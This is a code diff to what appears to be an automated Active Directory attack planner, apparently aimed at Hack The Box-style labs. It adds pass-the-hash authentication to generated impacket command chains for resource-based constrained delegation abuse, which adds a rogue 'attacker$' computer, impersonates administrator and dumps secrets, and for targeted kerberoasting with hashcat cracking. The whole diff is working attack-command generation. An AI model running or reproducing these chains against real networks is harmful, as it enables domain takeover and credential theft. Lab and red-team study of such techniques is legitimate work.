@@ -1142,17 +1142,22 @@ def run(report, store, ui=None):
                     # 'WEB01.HTB.LOCAL' -> 'WEB01'; 'WEB01$' -> 'WEB01'.
                     host_short = tgt.split(".")[0].rstrip("$")
                     fqdn = tgt if "." in tgt else f"{host_short}.{_dom_e}"
+                    # iter-102: hash-only actor auth. impacket-addcomputer +
+                    # impacket-rbcd both accept -hashes; append the -hashes
+                    # flag to the actor's auth. The final getST +
+                    # secretsdump use the attacker$ ccache so aren't affected.
+                    _hf = f" {_impacket_hash}" if _impacket_hash else ""
                     chains.append(Chain("R-RBCD", "RBCD via writeable AD object",
                         f"{r}: {actor} -> {tgt} "
                         f"(RBCD -> S4U2self+U2U -> LocalSystem)",
                         crit=8, conf=0.7, ready=1.2, prox=0.85,     # score 5.71
                         commands=[
                             f"impacket-addcomputer -computer-name 'attacker$' "
-                            f"-computer-pass 'P@ssw0rd!' -dc-host {_dc_e} "
-                            f"'{_dom_e}/{_owned}:{_owned_pw}'",
+                            f"-computer-pass 'P@ssw0rd!' -dc-host {_dc_e}{_hf} "
+                            f"{_impacket_uri}",
                             f"impacket-rbcd -delegate-from 'attacker$' "
-                            f"-delegate-to '{host_short}$' -action write "
-                            f"'{_dom_e}/{_owned}:{_owned_pw}'",
+                            f"-delegate-to '{host_short}$' -action write{_hf} "
+                            f"{_impacket_uri}",
                             f"impacket-getST -spn 'cifs/{fqdn}' -dc-ip {_dc_e} "
                             f"-impersonate administrator '{_dom_e}/attacker$:P@ssw0rd!'",
                             f"export KRB5CCNAME=administrator.ccache; "
@@ -1214,17 +1219,19 @@ def run(report, store, ui=None):
                 #     without functional DNS SRV lookups)
                 #   - final secretsdump step so the chain reaches its
                 #     terminal loot (was missing; chain stopped mid-way).
+                # iter-102: same hash-auth threading as primary R-RBCD branch.
+                _hf2 = f" {_impacket_hash}" if _impacket_hash else ""
                 chains.append(Chain("R-RBCD", "RBCD via AddAllowedToAct",
                     f"AddAllowedToAct: {actor} -> {tgt} "
                     f"(direct RBCD -> S4U2self+U2U)",
                     crit=8, conf=0.75, ready=1.3, prox=0.85,      # score 6.63
                     commands=[
                         f"impacket-addcomputer -computer-name 'attacker$' "
-                        f"-computer-pass 'P@ssw0rd!' -dc-host {_dc_e} "
-                        f"'{_dom_e}/{_owned}:{_owned_pw}'",
+                        f"-computer-pass 'P@ssw0rd!' -dc-host {_dc_e}{_hf2} "
+                        f"{_impacket_uri}",
                         f"impacket-rbcd -delegate-from 'attacker$' "
-                        f"-delegate-to '{host_short}$' -action write "
-                        f"'{_dom_e}/{_owned}:{_owned_pw}'",
+                        f"-delegate-to '{host_short}$' -action write{_hf2} "
+                        f"{_impacket_uri}",
                         f"impacket-getST -spn 'cifs/{fqdn}' -dc-ip {_dc_e} "
                         f"-impersonate administrator "
                         f"'{_dom_e}/attacker$:P@ssw0rd!'",
@@ -1236,16 +1243,20 @@ def run(report, store, ui=None):
                 # iter-51: WriteAccountRestrictions = write account UAC
                 # bits + SPN. Route to targeted-kerberoast (same as
                 # WriteSPN since attacker can add an SPN via UAC).
+                # iter-102: hash-auth threading as in R-WRITESPN.
+                _addspn_auth2 = (f"-hashes '{_blank_lm}:{_owned_hash}'"
+                                 if _owned_hash else f"-p '{_owned_pw}'")
+                _hf3 = f" {_impacket_hash}" if _impacket_hash else ""
                 chains.append(Chain("R-WRITESPN",
                     "targeted kerberoast via WriteAccountRestrictions",
                     f"WriteAccountRestrictions: {actor} -> {tgt} "
                     f"(set SPN + UAC -> kerberoast)",
                     crit=7, conf=0.75, ready=1.3, prox=0.85,       # score 5.80
                     commands=[
-                        f"impacket-addspn -u '{_dom_e}\\{_owned}' -p '{_owned_pw}' "
+                        f"impacket-addspn -u '{_dom_e}\\{_owned}' {_addspn_auth2} "
                         f"-t '{tgt}' -s 'HTTP/kerberoast' {_dc_e}",
                         f"impacket-GetUserSPNs -request-user '{tgt}' -dc-ip {_dc_e} "
-                        f"'{_dom_e}/{_owned}:{_owned_pw}' | tee tgs.txt",
+                        f"{_impacket_uri}{_hf3} | tee tgs.txt",
                         "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AddSelf":
